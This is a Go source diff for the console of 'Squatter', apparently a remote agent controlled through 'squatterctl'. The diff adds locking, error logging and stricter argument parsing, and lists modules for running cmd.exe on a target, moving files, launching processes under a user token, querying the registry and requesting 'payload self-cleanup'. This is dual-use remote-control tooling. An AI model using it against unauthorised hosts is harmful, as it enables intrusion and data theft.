@@ -8,6 +8,7 @@ import (
 	"errors"
 	"fmt"
 	"io"
+	"log"
 	"os"
 	"path/filepath"
 	"strconv"
@@ -24,6 +25,7 @@ import (
 type Client struct {
 	conn io.ReadWriteCloser
 	r    *bufio.Reader
+	mu   sync.Mutex
 	sid  uint64
 }
 
@@ -31,7 +33,22 @@ func New(conn io.ReadWriteCloser) *Client {
 	return &Client{conn: conn, r: bufio.NewReader(conn)}
 }
 
-func (c *Client) nextSID() uint64 { c.sid++; return c.sid }
+func (c *Client) nextSID() uint64 {
+	c.mu.Lock()
+	defer c.mu.Unlock()
+	return c.nextSIDLocked()
+}
+
+func (c *Client) nextSIDLocked() uint64 { c.sid++; return c.sid }
+
+// WithLockedTransport gives callers exclusive access to the Squatter frame
+// transport. It lets Hovel run typed session tasks over the existing connection
+// without interleaving frames with the interactive prompt.
+func (c *Client) WithLockedTransport(fn func(conn io.Writer, reader *bufio.Reader, sid uint64) error) error {
+	c.mu.Lock()
+	defer c.mu.Unlock()
+	return fn(c.conn, c.r, c.nextSIDLocked())
+}
 
 func emit(out io.Writer, payload []byte) error {
 	if err := writeFully(out, payload); err != nil {
@@ -64,6 +81,30 @@ func writeFully(out io.Writer, payload []byte) error {
 	return nil
 }
 
+func writeLine(out io.Writer, args ...any) {
+	if _, err := fmt.Fprintln(out, args...); err != nil {
+		log.Printf("squatter shell: write line: %v", err)
+	}
+}
+
+func writeText(out io.Writer, text string) {
+	if _, err := fmt.Fprint(out, text); err != nil {
+		log.Printf("squatter shell: write text: %v", err)
+	}
+}
+
+func writeFormat(out io.Writer, format string, args ...any) {
+	if _, err := fmt.Fprintf(out, format, args...); err != nil {
+		log.Printf("squatter shell: write formatted text: %v", err)
+	}
+}
+
+func logShellError(action string, err error) {
+	if err != nil {
+		log.Printf("squatter shell: %s: %v", action, err)
+	}
+}
+
 const streamInteractiveRaw uint32 = 1
 
 type streamStart struct {
@@ -75,17 +116,22 @@ type streamStart struct {
 // Run drives the default interactive Squatter shell.
 func (c *Client) Run(in io.Reader, out io.Writer) {
 	input := bufio.NewReader(in)
-	fmt.Fprintln(out, "squatter shell -- run a module: <name> [args...]   (e.g. 'echo a b')")
-	fmt.Fprintln(out, "  echo <args...>                  open the echo module (interactive)")
-	fmt.Fprintln(out, "  cmd [command...]                open cmd.exe, or run one command through cmd.exe /c")
-	fmt.Fprintln(out, "  getfile <remote> [local]        download a file (fixed memory)")
-	fmt.Fprintln(out, "  putfile <local> <remote>        upload a file (fixed memory)")
-	fmt.Fprintln(out, "  quit                            exit; inside a module, Ctrl-D detaches")
+	writeLine(out, "squatter shell -- run a module: <name> [args...]   (e.g. 'echo a b')")
+	writeLine(out, "  echo <args...>                  open the echo module (interactive)")
+	writeLine(out, "  cmd [command...]                open cmd.exe, or run one command through cmd.exe /c")
+	writeLine(out, "  wininfo                         collect native Windows host facts")
+	writeLine(out, "  process.list                    list processes")
+	writeLine(out, "  process.run <command> [ms]      run a process with typed exit metadata")
+	writeLine(out, "  process.run_as_user <command>   launch a process with an interactive user token")
+	writeLine(out, "  payload.status                  show Squatter lifecycle status")
+	writeLine(out, "  getfile <remote> [local]        download a file (fixed memory)")
+	writeLine(out, "  putfile <local> <remote>        upload a file (fixed memory)")
+	writeLine(out, "  quit                            exit; inside a module, Ctrl-D detaches")
 	for {
-		fmt.Fprint(out, "squatter> ")
+		writeText(out, "squatter> ")
 		line, err := input.ReadString('\n')
 		if err == io.EOF {
-			fmt.Fprintln(out)
+			writeLine(out)
 			return
 		}
 		cmd := strings.TrimSpace(line)
@@ -134,64 +180,97 @@ func (c *Client) RunPromptIO(input *os.File, output io.Writer, title string) {
 
 // RunDemo executes the scripted echo walkthrough used by squatterctl.
 func (c *Client) RunDemo(out io.Writer) {
+	c.mu.Lock()
+	defer c.mu.Unlock()
 	if err := c.openStream(1, "echo", []string{"alpha", "beta", "gamma"}); err != nil {
-		fmt.Fprintf(out, "[open failed: %v]\n", err)
+		writeFormat(out, "[open failed: %v]\n", err)
 		return
 	}
 	_, _, p, err := c.readDataOrClose()
 	if err != nil {
-		fmt.Fprintf(out, "[read failed: %v]\n", err)
+		writeFormat(out, "[read failed: %v]\n", err)
 		return
 	}
-	emit(out, p)
+	if err := emit(out, p); err != nil {
+		logShellError("emit demo output", err)
+		return
+	}
 	for _, msg := range []string{"hello", "world", "the quick brown fox"} {
 		if err := wire.WriteFrame(c.conn, wire.KindData, 1, []byte(msg)); err != nil {
-			fmt.Fprintf(out, "[write failed: %v]\n", err)
+			writeFormat(out, "[write failed: %v]\n", err)
 			return
 		}
 		_, _, p, err = c.readDataOrClose()
 		if err != nil {
-			fmt.Fprintf(out, "[read failed: %v]\n", err)
+			writeFormat(out, "[read failed: %v]\n", err)
 			return
 		}
-		_ = emit(out, p)
+		if err := emit(out, p); err != nil {
+			logShellError("emit demo output", err)
+			return
+		}
 	}
 	if err := wire.WriteFrame(c.conn, wire.KindData, 1, []byte("END")); err != nil {
-		fmt.Fprintf(out, "[write failed: %v]\n", err)
+		writeFormat(out, "[write failed: %v]\n", err)
 		return
 	}
 	k, _, _, err := wire.ReadFrame(c.r)
 	if err != nil {
-		fmt.Fprintf(out, "[read failed: %v]\n", err)
+		writeFormat(out, "[read failed: %v]\n", err)
 		return
 	}
 	if k == wire.KindClose {
-		fmt.Fprintln(out, "[closed]")
+		writeLine(out, "[closed]")
 	}
 }
 
 // RunStreams runs the parallel stream smoke mode used by squatterctl.
 func (c *Client) RunStreams(out io.Writer, n int) {
+	c.mu.Lock()
+	defer c.mu.Unlock()
 	for s := 0; s < n; s++ {
-		_ = c.openStream(uint64(100+s), "echo", []string{fmt.Sprintf("task%d", s)})
+		if err := c.openStream(uint64(100+s), "echo", []string{fmt.Sprintf("task%d", s)}); err != nil {
+			logShellError("open stream", err)
+			return
+		}
 	}
 	for i := 0; i < n; i++ {
-		_, sid, p, _ := c.readDataOrClose()
-		fmt.Fprintf(out, "stream %d: %s\n", sid, p)
+		_, sid, p, err := c.readDataOrClose()
+		if err != nil {
+			logShellError("read stream", err)
+			return
+		}
+		writeFormat(out, "stream %d: %s\n", sid, p)
 	}
 	for s := 0; s < n; s++ {
-		_ = wire.WriteFrame(c.conn, wire.KindData, uint64(100+s), []byte(fmt.Sprintf("msg-%d", s)))
+		if err := wire.WriteFrame(c.conn, wire.KindData, uint64(100+s), []byte(fmt.Sprintf("msg-%d", s))); err != nil {
+			logShellError("write stream", err)
+			return
+		}
 	}
 	for i := 0; i < n; i++ {
-		_, sid, p, _ := c.readDataOrClose()
-		fmt.Fprintf(out, "stream %d echoed %q\n", sid, p)
+		_, sid, p, err := c.readDataOrClose()
+		if err != nil {
+			logShellError("read stream", err)
+			return
+		}
+		writeFormat(out, "stream %d echoed %q\n", sid, p)
 	}
 	for s := 0; s < n; s++ {
-		_ = wire.WriteFrame(c.conn, wire.KindData, uint64(100+s), []byte("END"))
+		if err := wire.WriteFrame(c.conn, wire.KindData, uint64(100+s), []byte("END")); err != nil {
+			logShellError("close stream", err)
+			return
+		}
 	}
 }
 
 func (c *Client) runCommand(out io.Writer, sid uint64, module string, args []string, in *bufio.Reader) bool {
+	c.mu.Lock()
+	defer c.mu.Unlock()
+	return c.runCommandLocked(out, sid, module, args, in)
+}
+
+func (c *Client) runCommandLocked(out io.Writer, sid uint64, module string, args []string, in *bufio.Reader) bool {
 	start := c.startStream(out, sid, module, args)
 	if !start.alive || !start.active {
 		return start.alive
@@ -213,19 +292,19 @@ func (c *Client) readDataOrClose() (uint16, uint64, []byte, error) {
 
 func (c *Client) startStream(out io.Writer, sid uint64, module string, args []string) streamStart {
 	if err := c.openStream(sid, module, args); err != nil {
-		fmt.Fprintln(out, "[disconnected]")
+		writeLine(out, "[disconnected]")
 		return streamStart{}
 	}
 	for {
 		kind, _, payload, err := wire.ReadFrame(c.r)
 		if err != nil {
-			fmt.Fprintln(out, "[disconnected]")
+			writeLine(out, "[disconnected]")
 			return streamStart{}
 		}
 		switch kind {
 		case wire.KindData:
 			if err := emitRaw(out, payload); err != nil {
-				fmt.Fprintln(out, "[disconnected]")
+				writeLine(out, "[disconnected]")
 				return streamStart{}
 			}
 		case wire.KindControl:
@@ -237,7 +316,7 @@ func (c *Client) startStream(out io.Writer, sid uint64, module string, args []st
 				return streamStart{alive: true, active: true, raw: event.Code == streamInteractiveRaw}
 			}
 			if event.Kind == wire.EventError && event.Message != "" {
-				fmt.Fprintf(out, "[%s error: %s]\n", module, event.Message)
+				writeFormat(out, "[%s error: %s]\n", module, event.Message)
 			}
 		case wire.KindClose:
 			return streamStart{alive: true}
@@ -247,15 +326,15 @@ func (c *Client) startStream(out io.Writer, sid uint64, module string, args []st
 
 func (c *Client) runLineStream(out io.Writer, sid uint64, module string, in *bufio.Reader) bool {
 	for {
-		fmt.Fprintf(out, "%s> ", module)
+		writeFormat(out, "%s> ", module)
 		line, err := in.ReadString('\n')
 		if errors.Is(err, io.EOF) {
-			fmt.Fprintln(out)
-			_ = wire.WriteFrame(c.conn, wire.KindClose, sid, nil)
+			writeLine(out)
+			logShellError("close line stream", wire.WriteFrame(c.conn, wire.KindClose, sid, nil))
 			return c.drainUntilClose()
 		}
 		if err != nil {
-			fmt.Fprintln(out, "[disconnected]")
+			writeLine(out, "[disconnected]")
 			return false
 		}
 		line = strings.TrimRight(line, "\r\n")
@@ -263,7 +342,7 @@ func (c *Client) runLineStream(out io.Writer, sid uint64, module string, in *buf
 			continue
 		}
 		if err := wire.WriteFrame(c.conn, wire.KindData, sid, []byte(line)); err != nil {
-			fmt.Fprintln(out, "[disconnected]")
+			writeLine(out, "[disconnected]")
 			return false
 		}
 		if !c.readActiveResponse(out) {
@@ -285,7 +364,7 @@ func (c *Client) runRawLines(out io.Writer, sid uint64, in *bufio.Reader) bool {
 		line, err := in.ReadString('\n')
 		if len(line) > 0 {
 			if err := wire.WriteFrame(c.conn, wire.KindData, sid, []byte(line)); err != nil {
-				fmt.Fprintln(out, "[disconnected]")
+				writeLine(out, "[disconnected]")
 				return false
 			}
 		}
@@ -295,11 +374,11 @@ func (c *Client) runRawLines(out io.Writer, sid uint64, in *bufio.Reader) bool {
 				return alive
 			case <-time.After(50 * time.Millisecond):
 			}
-			_ = wire.WriteFrame(c.conn, wire.KindClose, sid, nil)
+			logShellError("close raw stream", wire.WriteFrame(c.conn, wire.KindClose, sid, nil))
 			return <-done
 		}
 		if err != nil {
-			fmt.Fprintln(out, "[disconnected]")
+			writeLine(out, "[disconnected]")
 			return false
 		}
 	}
@@ -309,7 +388,7 @@ func (c *Client) readActiveResponse(out io.Writer) bool {
 	for {
 		kind, _, payload, err := wire.ReadFrame(c.r)
 		if err != nil {
-			fmt.Fprintln(out, "[disconnected]")
+			writeLine(out, "[disconnected]")
 			return false
 		}
 		switch kind {
@@ -321,7 +400,7 @@ func (c *Client) readActiveResponse(out io.Writer) bool {
 		case wire.KindControl:
 			event, err := wire.DecodeStreamEvent(payload)
 			if err == nil && event.Kind == wire.EventError && event.Message != "" {
-				fmt.Fprintf(out, "[stream error: %s]\n", event.Message)
+				writeFormat(out, "[stream error: %s]\n", event.Message)
 			}
 		case wire.KindClose:
 			return false
@@ -333,7 +412,7 @@ func (c *Client) drainStreamFrames(out io.Writer, done chan<- bool) {
 	for {
 		kind, _, payload, err := wire.ReadFrame(c.r)
 		if err != nil {
-			fmt.Fprintln(out, "[disconnected]")
+			writeLine(out, "[disconnected]")
 			done <- false
 			return
 		}
@@ -349,7 +428,7 @@ func (c *Client) drainStreamFrames(out io.Writer, done chan<- bool) {
 				continue
 			}
 			if event.Kind == wire.EventError && event.Message != "" {
-				fmt.Fprintf(out, "[stream error: %s]\n", event.Message)
+				writeFormat(out, "[stream error: %s]\n", event.Message)
 			}
 		case wire.KindClose:
 			done <- true
@@ -377,7 +456,7 @@ func (c *Client) attachTerminal(input *os.File, out io.Writer, sid uint64) bool 
 			raw := append([]byte(nil), buf[:n]...)
 			payload := bytes.ReplaceAll(raw, []byte{'\r'}, []byte{'\n'})
 			if err := wire.WriteFrame(c.conn, wire.KindData, sid, payload); err != nil {
-				fmt.Fprintln(out, "[disconnected]")
+				writeLine(out, "[disconnected]")
 				return false
 			}
 			if err := echoAttachInput(out, raw); err != nil {
@@ -392,10 +471,10 @@ func (c *Client) attachTerminal(input *os.File, out io.Writer, sid uint64) bool 
 			continue
 		}
 		if errors.Is(err, io.EOF) {
-			_ = wire.WriteFrame(c.conn, wire.KindClose, sid, nil)
+			logShellError("close attached stream", wire.WriteFrame(c.conn, wire.KindClose, sid, nil))
 			return <-done
 		}
-		fmt.Fprintln(out, "[disconnected]")
+		writeLine(out, "[disconnected]")
 		return false
 	}
 }
@@ -475,8 +554,14 @@ func moduleArgsFromLine(line string, parts []string) (string, []string) {
 }
 
 func (c *Client) cmdGetfile(out io.Writer, sid uint64, args []string) bool {
+	c.mu.Lock()
+	defer c.mu.Unlock()
+	return c.cmdGetfileLocked(out, sid, args)
+}
+
+func (c *Client) cmdGetfileLocked(out io.Writer, sid uint64, args []string) bool {
 	if len(args) < 1 {
-		fmt.Fprintln(out, "usage: getfile <remote-path> [local-path]")
+		writeLine(out, "usage: getfile <remote-path> [local-path]")
 		return true
 	}
 	remote := args[0]
@@ -489,40 +574,46 @@ func (c *Client) cmdGetfile(out io.Writer, sid uint64, args []string) bool {
 	}
 	f, err := os.Create(local)
 	if err != nil {
-		fmt.Fprintf(out, "[cannot create %s: %v]\n", local, err)
+		writeFormat(out, "[cannot create %s: %v]\n", local, err)
 		return true
 	}
-	defer f.Close()
+	defer func() { logShellError("close downloaded file", f.Close()) }()
 	n, err := xfer.GetFile(c.conn, c.r, sid, remote, f)
 	if err != nil {
-		fmt.Fprintf(out, "[getfile failed: %v]\n", err)
+		writeFormat(out, "[getfile failed: %v]\n", err)
 		return c.conn != nil
 	}
-	fmt.Fprintf(out, "got %s: %d bytes\n", local, n)
+	writeFormat(out, "got %s: %d bytes\n", local, n)
 	return true
 }
 
 func (c *Client) cmdPutfile(out io.Writer, sid uint64, args []string) bool {
+	c.mu.Lock()
+	defer c.mu.Unlock()
+	return c.cmdPutfileLocked(out, sid, args)
+}
+
+func (c *Client) cmdPutfileLocked(out io.Writer, sid uint64, args []string) bool {
 	if len(args) < 2 {
-		fmt.Fprintln(out, "usage: putfile <local-path> <remote-path>")
+		writeLine(out, "usage: putfile <local-path> <remote-path>")
 		return true
 	}
 	local, remote := args[0], strings.Join(args[1:], " ")
 	f, err := os.Open(local)
 	if err != nil {
-		fmt.Fprintf(out, "[cannot open %s: %v]\n", local, err)
+		writeFormat(out, "[cannot open %s: %v]\n", local, err)
 		return true
 	}
-	defer f.Close()
+	defer func() { logShellError("close uploaded file", f.Close()) }()
 	sent, ack, err := xfer.PutFile(c.conn, c.r, sid, f, remote)
 	if err != nil {
-		fmt.Fprintf(out, "[putfile failed: %v]\n", err)
+		writeFormat(out, "[putfile failed: %v]\n", err)
 		return false
 	}
 	if ack != "" {
-		fmt.Fprintln(out, ack)
+		writeLine(out, ack)
 	}
-	fmt.Fprintf(out, "put %s -> %s: %d bytes\n", local, remote, sent)
+	writeFormat(out, "put %s -> %s: %d bytes\n", local, remote, sent)
 	return true
 }
 
@@ -540,6 +631,7 @@ type interactiveShell struct {
 	active   string
 	activeID uint64
 	raw      bool
+	locked   bool
 }
 
 type promptTerminal interface {
@@ -576,23 +668,13 @@ func (s *interactiveShell) runPrompt(extraOptions ...prompt.Option) {
 	prompt.New(s.execute, s.complete, options...).Run()
 }
 
-func (s *interactiveShell) runPromptSafely(extraOptions ...prompt.Option) (ok bool) {
-	defer func() {
-		if recover() != nil {
-			ok = false
-		}
-	}()
-	s.runPrompt(extraOptions...)
-	return true
-}
-
 func (s *interactiveShell) runPTYPrompt(terminal promptTerminal) bool {
 	s.printBanner()
 	if err := terminal.Setup(); err != nil {
 		return false
 	}
 	defer func() {
-		_ = terminal.TearDown()
+		logShellError("tear down prompt terminal", terminal.TearDown())
 	}()
 
 	ui := newShellPromptUI(s, terminal.Writer())
@@ -630,7 +712,10 @@ func (s *interactiveShell) runPTYPrompt(terminal promptTerminal) bool {
 				if err := ui.breakLine(); err != nil {
 					return false
 				}
-				_ = terminal.TearDown()
+				if err := terminal.TearDown(); err != nil {
+					logShellError("tear down prompt terminal", err)
+					return false
+				}
 				s.execute(event.line)
 				if s.done {
 					return true
@@ -654,11 +739,6 @@ func (s *interactiveShell) runPTYPrompt(terminal promptTerminal) bool {
 	return true
 }
 
-func (s *interactiveShell) runTerminalPrompt(input io.Reader) {
-	s.printBanner()
-	s.runTerminalPromptLoop(input)
-}
-
 func (s *interactiveShell) runTerminalPromptLoop(input io.Reader) {
 	reader := bufio.NewReader(input)
 	for !s.done {
@@ -673,7 +753,7 @@ func (s *interactiveShell) runTerminalPromptLoop(input io.Reader) {
 			return
 		}
 		if err != nil {
-			fmt.Fprintln(s.output(), errorStyle().Render("[disconnected]"))
+			writeLine(s.output(), errorStyle().Render("[disconnected]"))
 			return
 		}
 	}
@@ -684,16 +764,16 @@ func (s *interactiveShell) printBanner() {
 	hot := lipgloss.NewStyle().Foreground(lipgloss.Color("205")).Bold(true)
 	cool := lipgloss.NewStyle().Foreground(lipgloss.Color("45")).Bold(true)
 	muted := lipgloss.NewStyle().Foreground(lipgloss.Color("244"))
-	fmt.Fprintln(out, hot.Render("  ____   ___  _   _    _  _____ _____ _____ ____"))
-	fmt.Fprintln(out, hot.Render(" / ___| / _ \\| | | |  / \\|_   _|_   _| ____|  _ \\"))
-	fmt.Fprintln(out, hot.Render(" \\___ \\| | | | | | | / _ \\ | |   | | |  _| | |_) |"))
-	fmt.Fprintln(out, hot.Render("  ___) | |_| | |_| |/ ___ \\| |   | | | |___|  _ <"))
-	fmt.Fprintln(out, hot.Render(" |____/ \\__\\_\\\\___//_/   \\_\\_|   |_| |_____|_| \\_\\"))
+	writeLine(out, hot.Render("  ____   ___  _   _    _  _____ _____ _____ ____"))
+	writeLine(out, hot.Render(" / ___| / _ \\| | | |  / \\|_   _|_   _| ____|  _ \\"))
+	writeLine(out, hot.Render(" \\___ \\| | | | | | | / _ \\ | |   | | |  _| | |_) |"))
+	writeLine(out, hot.Render("  ___) | |_| | |_| |/ ___ \\| |   | | | |___|  _ <"))
+	writeLine(out, hot.Render(" |____/ \\__\\_\\\\___//_/   \\_\\_|   |_| |_____|_| \\_\\"))
 	if strings.TrimSpace(s.title) != "" {
-		fmt.Fprintln(out, cool.Render("squatterctl ")+muted.Render(s.title))
+		writeLine(out, cool.Render("squatterctl ")+muted.Render(s.title))
 	}
-	fmt.Fprintln(out, muted.Render("tab completes commands, arrows browse history, Ctrl-D exits, detach leaves a module"))
-	fmt.Fprintln(out)
+	writeLine(out, muted.Render("tab completes commands, arrows browse history, Ctrl-D exits, detach leaves a module"))
+	writeLine(out)
 }
 
 func (s *interactiveShell) output() io.Writer {
@@ -748,26 +828,34 @@ func (s *interactiveShell) execute(line string) {
 	sid := s.client.nextSID()
 	switch parts[0] {
 	case "getfile":
-		_ = s.client.cmdGetfile(s.output(), sid, parts[1:])
+		if !s.client.cmdGetfile(s.output(), sid, parts[1:]) {
+			s.done = true
+		}
 	case "putfile":
-		_ = s.client.cmdPutfile(s.output(), sid, parts[1:])
+		if !s.client.cmdPutfile(s.output(), sid, parts[1:]) {
+			s.done = true
+		}
 	default:
 		module, args := moduleArgsFromLine(line, parts)
+		s.client.mu.Lock()
 		start := s.client.startStream(s.output(), sid, module, args)
 		if !start.alive {
+			s.client.mu.Unlock()
 			s.done = true
 			return
 		}
 		if !start.active {
+			s.client.mu.Unlock()
 			return
 		}
 		if start.raw && s.input != nil {
 			if !s.client.attachTerminal(s.input, s.output(), sid) {
 				s.done = true
 			}
+			s.client.mu.Unlock()
 			return
 		}
-		s.setActive(module, sid, start.raw)
+		s.setActive(module, sid, start.raw, true)
 	}
 }
 
@@ -775,12 +863,13 @@ func (s *interactiveShell) executeActive(line string) {
 	_, activeID, raw := s.activeState()
 	switch line {
 	case "detach":
-		_ = wire.WriteFrame(s.client.conn, wire.KindClose, activeID, nil)
+		logShellError("detach active stream", wire.WriteFrame(s.client.conn, wire.KindClose, activeID, nil))
 		s.clearActive()
 		return
 	case "quit", "exit":
-		_ = wire.WriteFrame(s.client.conn, wire.KindClose, activeID, nil)
+		logShellError("close active stream", wire.WriteFrame(s.client.conn, wire.KindClose, activeID, nil))
 		s.done = true
+		s.clearActive()
 		return
 	}
 	payload := []byte(line)
@@ -788,8 +877,9 @@ func (s *interactiveShell) executeActive(line string) {
 		payload = append(payload, '\n')
 	}
 	if err := wire.WriteFrame(s.client.conn, wire.KindData, activeID, payload); err != nil {
-		fmt.Fprintln(s.output(), errorStyle().Render("[disconnected]"))
+		writeLine(s.output(), errorStyle().Render("[disconnected]"))
 		s.done = true
+		s.clearActive()
 		return
 	}
 	if raw {
@@ -808,20 +898,26 @@ func (s *interactiveShell) complete(document prompt.Document) []prompt.Suggest {
 	return Suggestions(active, document.TextBeforeCursor())
 }
 
-func (s *interactiveShell) setActive(module string, sid uint64, raw bool) {
+func (s *interactiveShell) setActive(module string, sid uint64, raw bool, locked bool) {
 	s.mu.Lock()
 	defer s.mu.Unlock()
 	s.active = module
 	s.activeID = sid
 	s.raw = raw
+	s.locked = locked
 }
 
 func (s *interactiveShell) clearActive() {
 	s.mu.Lock()
-	defer s.mu.Unlock()
+	locked := s.locked
 	s.active = ""
 	s.activeID = 0
 	s.raw = false
+	s.locked = false
+	s.mu.Unlock()
+	if locked {
+		s.client.mu.Unlock()
+	}
 }
 
 func (s *interactiveShell) activeState() (string, uint64, bool) {
@@ -834,13 +930,19 @@ func (s *interactiveShell) printHelp() {
 	out := s.output()
 	style := lipgloss.NewStyle().Foreground(lipgloss.Color("45")).Bold(true)
 	muted := lipgloss.NewStyle().Foreground(lipgloss.Color("244"))
-	fmt.Fprintln(out, style.Render("commands"))
-	fmt.Fprintln(out, "  cmd [command...]          "+muted.Render("open cmd.exe, or run through cmd.exe /c"))
-	fmt.Fprintln(out, "  echo <args...>            "+muted.Render("open the echo module"))
-	fmt.Fprintln(out, "  getfile <remote> [local]  "+muted.Render("download from target"))
-	fmt.Fprintln(out, "  putfile <local> <remote>  "+muted.Render("upload to target"))
-	fmt.Fprintln(out, "  detach                    "+muted.Render("leave an active module"))
-	fmt.Fprintln(out, "  quit                      "+muted.Render("close squatterctl"))
+	writeLine(out, style.Render("commands"))
+	writeLine(out, "  cmd [command...]          "+muted.Render("open cmd.exe, or run through cmd.exe /c"))
+	writeLine(out, "  wininfo                   "+muted.Render("collect native Windows host facts"))
+	writeLine(out, "  process.list              "+muted.Render("list processes"))
+	writeLine(out, "  process.run <cmd> [ms]    "+muted.Render("run a process with exit metadata"))
+	writeLine(out, "  process.run_as_user <command> "+muted.Render("launch with an interactive user token"))
+	writeLine(out, "  payload.status            "+muted.Render("show Squatter lifecycle status"))
+	writeLine(out, "  payload.cleanup           "+muted.Render("request Squatter self-cleanup"))
+	writeLine(out, "  echo <args...>            "+muted.Render("open the echo module"))
+	writeLine(out, "  getfile <remote> [local]  "+muted.Render("download from target"))
+	writeLine(out, "  putfile <local> <remote>  "+muted.Render("upload to target"))
+	writeLine(out, "  detach                    "+muted.Render("leave an active module"))
+	writeLine(out, "  quit                      "+muted.Render("close squatterctl"))
 }
 
 func errorStyle() lipgloss.Style {
@@ -1181,6 +1283,33 @@ func Suggestions(activeModule, line string) []prompt.Suggest {
 			{Text: "hostname", Description: "print target host name"},
 			{Text: "echo hello", Description: "small output smoke test"},
 		}, prefix)
+	case "process.run":
+		return filterPromptSuggestions([]prompt.Suggest{
+			{Text: "hostname", Description: "small process smoke test"},
+			{Text: "ipconfig /all", Description: "network configuration"},
+			{Text: "10000", Description: "timeout in milliseconds"},
+		}, prefix)
+	case "process.run_as_user":
+		return filterPromptSuggestions([]prompt.Suggest{
+			{Text: `C:\WINDOWS\explorer.exe`, Description: "restart Explorer on the interactive desktop"},
+			{Text: `C:\WINDOWS\system32\notepad.exe`, Description: "small desktop process smoke test"},
+			{Text: `C:\WINDOWS`, Description: "optional working directory"},
+		}, prefix)
+	case "file.stat":
+		return filterPromptSuggestions([]prompt.Suggest{
+			{Text: `C:\Windows\System32\cmd.exe`, Description: "common system binary"},
+			{Text: `C:\boot.ini`, Description: "small XP-era smoke-test file"},
+		}, prefix)
+	case "registry.query":
+		return filterPromptSuggestions([]prompt.Suggest{
+			{Text: "HKLM", Description: "local machine hive"},
+			{Text: `SOFTWARE\Microsoft\Windows NT\CurrentVersion`, Description: "Windows version key"},
+		}, prefix)
+	case "eventlog.query":
+		return filterPromptSuggestions([]prompt.Suggest{
+			{Text: "System", Description: "system event log"},
+			{Text: "Application", Description: "application event log"},
+		}, prefix)
 	default:
 		return nil
 	}
@@ -1192,6 +1321,18 @@ func topLevelSuggestions() []prompt.Suggest {
 		{Text: "echo", Description: "open the echo module"},
 		{Text: "getfile", Description: "download a file from target"},
 		{Text: "putfile", Description: "upload a file to target"},
+		{Text: "wininfo", Description: "collect native Windows host facts"},
+		{Text: "process.list", Description: "list processes"},
+		{Text: "process.run", Description: "run process with typed exit metadata"},
+		{Text: "process.run_as_user", Description: "launch process with an interactive user token"},
+		{Text: "payload.status", Description: "show Squatter lifecycle status"},
+		{Text: "payload.cleanup", Description: "request Squatter self-cleanup"},
+		{Text: "file.stat", Description: "stat and hash a file"},
+		{Text: "registry.query", Description: "query a registry value"},
+		{Text: "eventlog.query", Description: "read recent event log records"},
+		{Text: "drive.list", Description: "list logical drives"},
+		{Text: "share.list", Description: "list local shares"},
+		{Text: "acl.stat", Description: "return SDDL for a path"},
 		{Text: "help", Description: "show command summary"},
 		{Text: "quit", Description: "close squatterctl"},
 		{Text: "exit", Description: "close squatterctl"},
@@ -1239,7 +1380,7 @@ type CLIOptions struct {
 	SMBPort  int
 }
 
-func ParseCLI(args []string) CLIOptions {
+func ParseCLI(args []string) (CLIOptions, error) {
 	opts := CLIOptions{Mode: ModeShell, Streams: 3, Host: "127.0.0.1", Port: "9100"}
 	positionals := make([]string, 0, 2)
 	for i := 0; i < len(args); i++ {
@@ -1249,36 +1390,50 @@ func ParseCLI(args []string) CLIOptions {
 		case "--streams":
 			opts.Mode = ModeStreams
 			i++
-			if i < len(args) {
-				opts.Streams, _ = strconv.Atoi(args[i])
+			if i >= len(args) {
+				return CLIOptions{}, fmt.Errorf("%s requires a value", args[i-1])
 			}
+			streams, err := strconv.Atoi(args[i])
+			if err != nil || streams < 1 {
+				return CLIOptions{}, fmt.Errorf("--streams must be a positive integer")
+			}
+			opts.Streams = streams
 		case "--smb":
 			opts.SMB = true
 		case "--domain":
 			i++
-			if i < len(args) {
-				opts.Domain = args[i]
+			if i >= len(args) {
+				return CLIOptions{}, fmt.Errorf("%s requires a value", args[i-1])
 			}
+			opts.Domain = args[i]
 		case "--user", "--username":
 			i++
-			if i < len(args) {
-				opts.Username = args[i]
+			if i >= len(args) {
+				return CLIOptions{}, fmt.Errorf("%s requires a value", args[i-1])
 			}
+			opts.Username = args[i]
 		case "--password":
 			i++
-			if i < len(args) {
-				opts.Password = args[i]
+			if i >= len(args) {
+				return CLIOptions{}, fmt.Errorf("%s requires a value", args[i-1])
 			}
+			opts.Password = args[i]
 		case "--pipe":
 			i++
-			if i < len(args) {
-				opts.Pipe = args[i]
+			if i >= len(args) {
+				return CLIOptions{}, fmt.Errorf("%s requires a value", args[i-1])
 			}
+			opts.Pipe = args[i]
 		case "--smb-port":
 			i++
-			if i < len(args) {
-				opts.SMBPort, _ = strconv.Atoi(args[i])
+			if i >= len(args) {
+				return CLIOptions{}, fmt.Errorf("%s requires a value", args[i-1])
 			}
+			port, err := strconv.Atoi(args[i])
+			if err != nil || port < 1 || port > 65535 {
+				return CLIOptions{}, fmt.Errorf("--smb-port must be an integer between 1 and 65535")
+			}
+			opts.SMBPort = port
 		default:
 			positionals = append(positionals, args[i])
 		}
@@ -1289,5 +1444,5 @@ func ParseCLI(args []string) CLIOptions {
 	if len(positionals) > 1 {
 		opts.Port = positionals[1]
 	}
-	return opts
+	return opts, nil
 }
